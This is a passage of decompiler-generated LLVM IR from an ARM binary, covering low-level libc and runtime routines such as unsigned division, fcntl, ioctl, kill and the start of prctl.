dec_label_pc_fba0:                                ; preds = %bb82, %dec_label_pc_fb8c, %bb83
  %v2_fbac59 = phi i32 [ %v3_fb98, %bb83 ], [ %v1_fb98, %bb82 ], [ %v1_fb98, %dec_label_pc_fb8c ]
  %v1_fba451 = phi i32 [ %v3_fb94, %bb83 ], [ %v1_fb94, %bb82 ], [ %v1_fb94, %dec_label_pc_fb8c ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fba4

dec_label_pc_fba4:                                ; preds = %.thread11, %dec_label_pc_fba0
  %v1_fbd8 = phi i32 [ %v4_fbd8, %.thread11 ], [ %v2_fbac59, %dec_label_pc_fba0 ]
  %v1_fbac = phi i32 [ %v0_fbe4, %.thread11 ], [ 0, %dec_label_pc_fba0 ]
  %v1_fbdc = phi i32 [ %v4_fbdc, %.thread11 ], [ %v1_fba451, %dec_label_pc_fba0 ]
  %v1_fba8 = phi i32 [ %v0_fbd4, %.thread11 ], [ %v0_fb58, %dec_label_pc_fba0 ]
  %v3_fba4 = icmp ult i32 %v1_fba8, %v1_fbdc
  br i1 %v3_fba4, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_fba4
  %v3_fba8 = sub i32 %v1_fba8, %v1_fbdc
  store i32 %v3_fba8, i32* %r0.global-to-local, align 4
  %v3_fbac = or i32 %v1_fbac, %v1_fbd8
  store i32 %v3_fbac, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_fba4, %bb84
  %v1_fbb4 = phi i32 [ %v1_fba8, %dec_label_pc_fba4 ], [ %v3_fba8, %bb84 ]
  %v1_fbb8 = phi i32 [ %v1_fbac, %dec_label_pc_fba4 ], [ %v3_fbac, %bb84 ]
  %v4_fbb0 = udiv i32 %v1_fbdc, 2
  %v6_fbb0 = icmp ult i32 %v1_fbb4, %v4_fbb0
  br i1 %v6_fbb0, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_fbb4 = urem i32 %v1_fbdc, 2
  %v4_fbb4 = icmp eq i32 %v3_fbb4, 0
  %v6_fbb4 = sub i32 %v1_fbb4, %v4_fbb0
  store i32 %v6_fbb4, i32* %r0.global-to-local, align 4
  br i1 %v4_fbb4, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_fbb8 = udiv i32 %v1_fbd8, 2
  %v6_fbb8 = or i32 %v1_fbb8, %v5_fbb8
  store i32 %v6_fbb8, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_fbc0 = phi i32 [ %v6_fbb4, %bb85 ], [ %v1_fbb4, %.thread7 ], [ %v6_fbb4, %bb86 ]
  %v1_fbc4 = phi i32 [ %v1_fbb8, %bb85 ], [ %v1_fbb8, %.thread7 ], [ %v6_fbb8, %bb86 ]
  %v4_fbbc = udiv i32 %v1_fbdc, 4
  %v6_fbbc = icmp ult i32 %v1_fbc0, %v4_fbbc
  br i1 %v6_fbbc, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_fbc0 = and i32 %v1_fbdc, 2
  %v4_fbc0 = icmp eq i32 %v3_fbc0, 0
  %v6_fbc0 = sub i32 %v1_fbc0, %v4_fbbc
  store i32 %v6_fbc0, i32* %r0.global-to-local, align 4
  br i1 %v4_fbc0, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_fbc4 = udiv i32 %v1_fbd8, 4
  %v6_fbc4 = or i32 %v1_fbc4, %v5_fbc4
  store i32 %v6_fbc4, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_fbcc = phi i32 [ %v6_fbc0, %bb87 ], [ %v1_fbc0, %.thread8 ], [ %v6_fbc0, %bb88 ]
  %v1_fbd0 = phi i32 [ %v1_fbc4, %bb87 ], [ %v1_fbc4, %.thread8 ], [ %v6_fbc4, %bb88 ]
  %v4_fbc8 = udiv i32 %v1_fbdc, 8
  %v6_fbc8 = icmp ult i32 %v1_fbcc, %v4_fbc8
  br i1 %v6_fbc8, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_fbcc = and i32 %v1_fbdc, 4
  %v4_fbcc = icmp eq i32 %v3_fbcc, 0
  %v6_fbcc = sub i32 %v1_fbcc, %v4_fbc8
  store i32 %v6_fbcc, i32* %r0.global-to-local, align 4
  br i1 %v4_fbcc, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_fbd0 = udiv i32 %v1_fbd8, 8
  %v6_fbd0 = or i32 %v1_fbd0, %v5_fbd0
  store i32 %v6_fbd0, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_fbe4 = phi i32 [ %v1_fbd0, %bb89 ], [ %v1_fbd0, %.thread9 ], [ %v6_fbd0, %bb90 ]
  %v0_fbd4 = phi i32 [ %v6_fbcc, %bb89 ], [ %v1_fbcc, %.thread9 ], [ %v6_fbcc, %bb90 ]
  %v2_fbd4 = icmp eq i32 %v0_fbd4, 0
  br i1 %v2_fbd4, label %dec_label_pc_fbe4, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_fbd8, 16
  br i1 %tmp138, label %dec_label_pc_fbe4, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_fbd8 = udiv i32 %v1_fbd8, 16
  %v4_fbdc = udiv i32 %v1_fbdc, 16
  br label %dec_label_pc_fba4

dec_label_pc_fbe4:                                ; preds = %thread-pre-split, %bb91
  store i32 %v0_fbe4, i32* %r0.global-to-local, align 4
  ret i32 %v0_fbe4

dec_label_pc_fbec:                                ; preds = %dec_label_pc_fb58
  %v9_fb58 = icmp eq i32 %v0_fb58, %v1_fb58
  %. = zext i1 %v9_fb58 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_fbf8:                                ; preds = %dec_label_pc_fb60
  %v2_fbf8 = icmp ugt i32 %v1_fb58, 65535
  br i1 %v2_fbf8, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_fbf8
  %v2_fbfc = and i32 %v1_fb58, 32768
  %v3_fbfc = icmp eq i32 %v2_fbfc, 0
  %v4_fbfc = udiv i32 %v1_fb58, 65536
  br i1 %v3_fbfc, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_fbf8
  %v0_fc0865 = phi i32 [ %v1_fb58, %dec_label_pc_fbf8 ], [ %v4_fbfc, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_fc0c = phi i32 [ %v0_fc0865, %.thread16 ], [ %v4_fbfc, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_fc08 = icmp ugt i32 %v1_fc0c, 255
  br i1 %v2_fc08, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_fc0c = and i32 %v1_fc0c, 128
  %v3_fc0c = icmp eq i32 %v2_fc0c, 0
  %v4_fc0c = udiv i32 %v1_fc0c, 256
  br i1 %v3_fc0c, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_fc10 = or i32 %storemerge, 8
  store i32 %v2_fc10, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_fc1c = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_fc10, %bb98 ]
  %v1_fc18 = phi i32 [ %v1_fc0c, %bb96 ], [ %v4_fc0c, %bb97 ], [ %v4_fc0c, %bb98 ]
  %v2_fc14 = icmp ugt i32 %v1_fc18, 15
  br i1 %v2_fc14, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_fc18 = and i32 %v1_fc18, 8
  %v3_fc18 = icmp eq i32 %v2_fc18, 0
  %v4_fc18 = udiv i32 %v1_fc18, 16
  br i1 %v3_fc18, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_fc1c = add nsw i32 %v1_fc1c, 4
  store i32 %v2_fc1c, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_fc24 = phi i32 [ %v1_fc1c, %.thread17 ], [ %v1_fc1c, %bb99 ], [ %v2_fc1c, %bb100 ]
  %v5_fc28 = phi i32 [ %v1_fc18, %.thread17 ], [ %v4_fc18, %bb99 ], [ %v4_fc18, %bb100 ]
  %v2_fc20 = icmp ugt i32 %v5_fc28, 3
  %v7_fc20 = icmp eq i32 %v5_fc28, 4
  %v2_fc24 = xor i1 %v7_fc20, true
  %v3_fc24 = and i1 %v2_fc20, %v2_fc24
  br i1 %v3_fc24, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_fc24 = add nsw i32 %v4_fc24, 3
  store i32 %v5_fc24, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_fc28 = phi i32 [ %v4_fc24, %.thread18 ], [ %v5_fc24, %bb101 ]
  %v2_fc28 = xor i1 %v2_fc20, true
  %v3_fc28 = or i1 %v7_fc20, %v2_fc28
  br i1 %v3_fc28, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_fc28 = udiv i32 %v5_fc28, 2
  %v9_fc28 = add i32 %v4_fc28, %v8_fc28
  store i32 %v9_fc28, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_fc2c = phi i32 [ %v4_fc28, %bb102 ], [ %v9_fc28, %bb103 ]
  %v6_fc2c = lshr i32 %v0_fb58, %v1_fc2c
  store i32 %v6_fc2c, i32* %r0.global-to-local, align 4
  ret i32 %v6_fc2c

dec_label_pc_fc34:                                ; preds = %entry
  %v0_fc38 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_fc28, { 1, 0 }
  uselistorder i1 %v7_fc20, { 1, 0 }
  uselistorder i32 %v4_fc18, { 1, 0 }
  uselistorder i32 %v1_fc18, { 1, 0, 2, 3 }
  uselistorder i32 %v2_fc10, { 1, 0 }
  uselistorder i32 %v4_fc0c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_fc0c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_fbfc, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_fbd4, { 1, 0 }
  uselistorder i32 %v0_fbe4, { 1, 0, 2 }
  uselistorder i32 %v4_fbc8, { 1, 0 }
  uselistorder i32 %v1_fbd0, { 1, 2, 0 }
  uselistorder i32 %v4_fbbc, { 1, 0 }
  uselistorder i32 %v1_fbc4, { 1, 2, 0 }
  uselistorder i32 %v4_fbb0, { 1, 0 }
  uselistorder i32 %v1_fbb8, { 1, 2, 0 }
  uselistorder i32 %v1_fbdc, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_fbac, { 1, 0 }
  uselistorder i32 %v1_fbd8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_fb98, { 1, 0 }
  uselistorder i32 %v3_fb94, { 1, 0 }
  uselistorder i32 %v1_fb94, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_fb98, { 1, 2, 0, 3 }
  uselistorder i32 %v4_fb84, { 1, 0 }
  uselistorder i32 %v4_fb80, { 2, 1, 0 }
  uselistorder i32 %v1_fb84, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_fb8c.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_fb58, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_fb58, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_fb4c, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 65535, { 90, 0, 1, 12, 11, 2, 3, 42, 43, 22, 44, 21, 45, 14, 13, 4, 24, 46, 23, 47, 49, 15, 48, 5, 50, 51, 26, 52, 25, 53, 54, 55, 56, 27, 57, 58, 16, 59, 6, 30, 60, 61, 62, 29, 63, 28, 64, 66, 17, 65, 7, 67, 68, 34, 69, 31, 70, 32, 71, 33, 72, 18, 73, 74, 35, 75, 36, 76, 79, 80, 19, 77, 78, 8, 39, 81, 37, 82, 38, 83, 85, 20, 84, 9, 10, 86, 87, 41, 88, 40, 89 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_fbe4, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_fba0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fb8cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_fc4c = udiv i32 %arg1, %arg2
  ret i32 %v2_fc4c
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_fc68 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_fc68
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_fc84 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_fc84, 2
  br i1 %tmp, label %dec_label_pc_fcc0, label %dec_label_pc_fc9c

dec_label_pc_fc9c:                                ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_fcf4, label %dec_label_pc_fcb0

dec_label_pc_fcb0:                                ; preds = %dec_label_pc_fc9c
  %v0_fcb4 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_fce8

dec_label_pc_fcc0:                                ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_fcdc, label %dec_label_pc_fcf4

dec_label_pc_fcdc:                                ; preds = %dec_label_pc_fcc0
  %v0_fce0 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_fce8

dec_label_pc_fce8:                                ; preds = %dec_label_pc_fcb0, %dec_label_pc_fcdc
  %storemerge2 = phi i32 [ %v0_fcb4, %dec_label_pc_fcb0 ], [ %v0_fce0, %dec_label_pc_fcdc ]
  %storemerge.in = load i16, i16* @global_var_20d4c.598, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_fce8 = load i32, i32* %r2.global-to-local, align 4
  %v1_fce8 = sub i32 0, %v0_fce8
  store i32 %v1_fce8, i32* %r2.global-to-local, align 4
  %v3_fcec = add i32 %storemerge, %storemerge2
  %v4_fcec = inttoptr i32 %v3_fcec to i32*
  store i32 %v1_fce8, i32* %v4_fcec, align 4
  br label %dec_label_pc_fcf4

dec_label_pc_fcf4:                                ; preds = %dec_label_pc_fc9c, %dec_label_pc_fcc0, %dec_label_pc_fce8
  %storemerge1 = phi i32 [ -1, %dec_label_pc_fce8 ], [ %arg1, %dec_label_pc_fcc0 ], [ %arg1, %dec_label_pc_fc9c ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 5, 1, 4 }
  uselistorder label %dec_label_pc_fcf4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fce8, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_fd0c = load i32, i32* @r2, align 4
  %v9_fd0c = load i32, i32* @r3, align 4
  store i32 %v9_fd0c, i32* %stack_var_-4, align 4
  %v3_fd10 = load i32, i32* @r4, align 4
  store i32 %v3_fd10, i32* %stack_var_-32, align 4
  %v6_fd10 = load i32, i32* @r5, align 4
  %v12_fd10 = load i32, i32* @r7, align 4
  %v4_fd20 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 12684) to i32*), align 4
  %v2_fd28 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fd28, i32* @r3, align 4
  %v2_fd2c = icmp eq i32 %v4_fd20, 0
  %v0_fd34 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fd34, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_fd0c, i32* @r4, align 4
  br i1 %v2_fd2c, label %dec_label_pc_fd50, label %dec_label_pc_fd44

dec_label_pc_fd44:                                ; preds = %entry
  %v7_fd44 = icmp eq i32 %arg2, 7
  br i1 %v7_fd44, label %dec_label_pc_fd90, label %bb

bb:                                               ; preds = %dec_label_pc_fd44
  %v8_fd48 = icmp eq i32 %arg2, 14
  br i1 %v8_fd48, label %dec_label_pc_fd90, label %dec_label_pc_fd50

dec_label_pc_fd50:                                ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_fd34, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_fd34, -4095
  br i1 %tmp, label %dec_label_pc_fd88, label %dec_label_pc_fd70

dec_label_pc_fd70:                                ; preds = %dec_label_pc_fd50
  %v0_fd74 = call i32 @__aeabi_read_tp()
  %v3_fd78 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_fd78 = sext i16 %v3_fd78 to i32
  store i32 %v4_fd78, i32* @r3, align 4
  %v0_fd7c = load i32, i32* @r2, align 4
  %v1_fd7c = sub i32 0, %v0_fd7c
  store i32 %v1_fd7c, i32* @r2, align 4
  %v3_fd80 = add i32 %v4_fd78, %v0_fd74
  %v4_fd80 = inttoptr i32 %v3_fd80 to i32*
  store i32 %v1_fd7c, i32* %v4_fd80, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fd88

dec_label_pc_fd88:                                ; preds = %dec_label_pc_fd50, %dec_label_pc_fd70
  %v0_fd88 = phi i32 [ %v0_fd34, %dec_label_pc_fd50 ], [ -1, %dec_label_pc_fd70 ]
  br label %dec_label_pc_fddc

dec_label_pc_fd90:                                ; preds = %dec_label_pc_fd44, %bb
  %v0_fd90 = call i32 @__libc_enable_asynccancel()
  %v0_fd94 = load i32, i32* @r7, align 4
  store i32 %v0_fd94, i32* @r1, align 4
  store i32 %v0_fd90, i32* %r6.global-to-local, align 4
  %v0_fda0 = load i32, i32* @r5, align 4
  store i32 %v0_fda0, i32* %r0.global-to-local, align 4
  store i32 %v0_fda0, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_fda0, -4095
  br i1 %tmp15, label %dec_label_pc_fdd0, label %dec_label_pc_fdb8

dec_label_pc_fdb8:                                ; preds = %dec_label_pc_fd90
  %v1_fdbc = sub i32 0, %v0_fda0
  %v0_fdc0 = call i32 @__aeabi_read_tp()
  store i32 %v0_fdc0, i32* %r0.global-to-local, align 4
  %v3_fdc4 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_fdc4 = sext i16 %v3_fdc4 to i32
  store i32 %v4_fdc4, i32* @r3, align 4
  %v3_fdc8 = add i32 %v4_fdc4, %v0_fdc0
  %v4_fdc8 = inttoptr i32 %v3_fdc8 to i32*
  store i32 %v1_fdbc, i32* %v4_fdc8, align 4
  store i32 -1, i32* @r2, align 4
  %v0_fdd0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_fdd0

dec_label_pc_fdd0:                                ; preds = %dec_label_pc_fd90, %dec_label_pc_fdb8
  %v0_fdd4 = phi i32 [ %v0_fda0, %dec_label_pc_fd90 ], [ -1, %dec_label_pc_fdb8 ]
  %v0_fdd0 = phi i32 [ %v0_fd90, %dec_label_pc_fd90 ], [ %v0_fdd0.pre, %dec_label_pc_fdb8 ]
  store i32 %v0_fdd0, i32* %r0.global-to-local, align 4
  store i32 %v0_fdd4, i32* @r7, align 4
  %v1_fdd8 = call i32 @__libc_disable_asynccancel(i32 %v0_fdd0)
  store i32 %v1_fdd8, i32* %r0.global-to-local, align 4
  %v0_fddc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_fddc

dec_label_pc_fddc:                                ; preds = %dec_label_pc_fd88, %dec_label_pc_fdd0
  %v0_fddc = phi i32 [ %v0_fd88, %dec_label_pc_fd88 ], [ %v0_fddc.pre, %dec_label_pc_fdd0 ]
  store i32 %v0_fddc, i32* %r0.global-to-local, align 4
  %v2_fde4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_fde4, i32* @r4, align 4
  store i32 %v6_fd10, i32* @r5, align 4
  store i32 %v12_fd10, i32* @r7, align 4
  ret i32 %v0_fddc

; uselistorder directives
  uselistorder i32 %v0_fddc, { 1, 0 }
  uselistorder i32 %v0_fdd0, { 1, 0 }
  uselistorder i32 %v0_fda0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_fd34, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_fddc, { 1, 0 }
  uselistorder label %dec_label_pc_fdd0, { 1, 0 }
  uselistorder label %dec_label_pc_fd90, { 1, 0 }
  uselistorder label %dec_label_pc_fd88, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_fe10 = load i32, i32* @r0, align 4
  ret i32 %v1_fe10
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_fe14 = load i32, i32* @r3, align 4
  store i32 %v9_fe14, i32* %stack_var_-4, align 4
  %v3_fe18 = load i32, i32* @r4, align 4
  store i32 %v3_fe18, i32* %stack_var_-32, align 4
  %v6_fe18 = load i32, i32* @r5, align 4
  %v12_fe18 = load i32, i32* @r7, align 4
  %v4_fe28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 12684) to i32*), align 4
  %v2_fe30 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fe30, i32* @r3, align 4
  %v2_fe34 = icmp eq i32 %v4_fe28, 0
  %v0_fe3c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fe3c, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_fe34, label %dec_label_pc_fe4c, label %dec_label_pc_fe84

dec_label_pc_fe4c:                                ; preds = %entry
  %tmp = icmp ult i32 %v0_fe3c, -4095
  br i1 %tmp, label %dec_label_pc_fe7c, label %dec_label_pc_fe64

dec_label_pc_fe64:                                ; preds = %dec_label_pc_fe4c
  %v1_fe68 = sub i32 0, %v0_fe3c
  %v3_fe6c = load i16, i16* @global_var_20d4c.598, align 2
  %v4_fe6c = sext i16 %v3_fe6c to i32
  store i32 %v4_fe6c, i32* @r3, align 4
  %v0_fe70 = call i32 @__aeabi_read_tp()
  %v2_fe74 = load i32, i32* @r3, align 4
  %v3_fe74 = add i32 %v2_fe74, %v0_fe70
  %v4_fe74 = inttoptr i32 %v3_fe74 to i32*
  store i32 %v1_fe68, i32* %v4_fe74, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fe7c

dec_label_pc_fe7c:                                ; preds = %dec_label_pc_fe4c, %dec_label_pc_fe64
  %v0_fe7c = phi i32 [ %v0_fe3c, %dec_label_pc_fe4c ], [ -1, %dec_label_pc_fe64 ]
  br label %dec_label_pc_fed0

dec_label_pc_fe84:                                ; preds = %entry
  %v0_fe84 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_fe84, i32* %r6.global-to-local, align 4
  %v0_fe94 = load i32, i32* @r4, align 4
  store i32 %v0_fe94, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_fe94, -4095
  br i1 %tmp15, label %dec_label_pc_fec4, label %dec_label_pc_feac

dec_label_pc_feac:                                ; preds = %dec_label_pc_fe84
  %v1_feb0 = sub i32 0, %v0_fe94
  %v3_feb4 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_feb4 = sext i16 %v3_feb4 to i32
  store i32 %v4_feb4, i32* @r3, align 4
  %v0_feb8 = call i32 @__aeabi_read_tp()
  store i32 %v0_feb8, i32* %r0.global-to-local, align 4
  %v2_febc = load i32, i32* @r3, align 4
  %v3_febc = add i32 %v2_febc, %v0_feb8
  %v4_febc = inttoptr i32 %v3_febc to i32*
  store i32 %v1_feb0, i32* %v4_febc, align 4
  %v0_fec4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_fec4

dec_label_pc_fec4:                                ; preds = %dec_label_pc_fe84, %dec_label_pc_feac
  %v0_fec8 = phi i32 [ %v0_fe94, %dec_label_pc_fe84 ], [ -1, %dec_label_pc_feac ]
  %v0_fec4 = phi i32 [ %v0_fe84, %dec_label_pc_fe84 ], [ %v0_fec4.pre, %dec_label_pc_feac ]
  store i32 %v0_fec4, i32* %r0.global-to-local, align 4
  store i32 %v0_fec8, i32* @r7, align 4
  %v1_fecc = call i32 @__libc_disable_asynccancel(i32 %v0_fec4)
  store i32 %v1_fecc, i32* %r0.global-to-local, align 4
  %v0_fed0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_fed0

dec_label_pc_fed0:                                ; preds = %dec_label_pc_fe7c, %dec_label_pc_fec4
  %v0_fed0 = phi i32 [ %v0_fe7c, %dec_label_pc_fe7c ], [ %v0_fed0.pre, %dec_label_pc_fec4 ]
  store i32 %v0_fed0, i32* %r0.global-to-local, align 4
  %v2_fed8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_fed8, i32* @r4, align 4
  store i32 %v6_fe18, i32* @r5, align 4
  store i32 %v12_fe18, i32* @r7, align 4
  ret i32 %v0_fed0

; uselistorder directives
  uselistorder i32 %v0_fed0, { 1, 0 }
  uselistorder i32 %v0_fec4, { 1, 0 }
  uselistorder i32 %v0_fe94, { 1, 2, 0, 3 }
  uselistorder i32 %v0_fe3c, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_fed0, { 1, 0 }
  uselistorder label %dec_label_pc_fec4, { 1, 0 }
  uselistorder label %dec_label_pc_fe7c, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fef4 = load i32, i32* @r7, align 4
  store i32 %v3_fef4, i32* %stack_var_-8, align 4
  %v0_ff00 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ff00, -4095
  br i1 %tmp, label %dec_label_pc_ff20, label %dec_label_pc_ff08

dec_label_pc_ff08:                                ; preds = %entry
  %v1_ff0c = sub i32 0, %v0_ff00
  %v3_ff10 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_ff10 = sext i16 %v3_ff10 to i32
  %v0_ff14 = call i32 @__aeabi_read_tp()
  %v3_ff18 = add i32 %v4_ff10, %v0_ff14
  %v4_ff18 = inttoptr i32 %v3_ff18 to i32*
  store i32 %v1_ff0c, i32* %v4_ff18, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_ff20.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ff20

dec_label_pc_ff20:                                ; preds = %entry, %dec_label_pc_ff08
  %v1_ff24 = phi i32 [ %v0_ff00, %entry ], [ -1, %dec_label_pc_ff08 ]
  %v2_ff20 = phi i32 [ %v3_fef4, %entry ], [ %v2_ff20.pre, %dec_label_pc_ff08 ]
  store i32 %v2_ff20, i32* @r7, align 4
  ret i32 %v1_ff24

; uselistorder directives
  uselistorder i32 %v0_ff00, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ff20, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_ff2c = load i32, i32* @r4, align 4
  store i32 %v3_ff2c, i32* %stack_var_-12, align 4
  %v0_ff3c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ff3c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ff3c, -4095
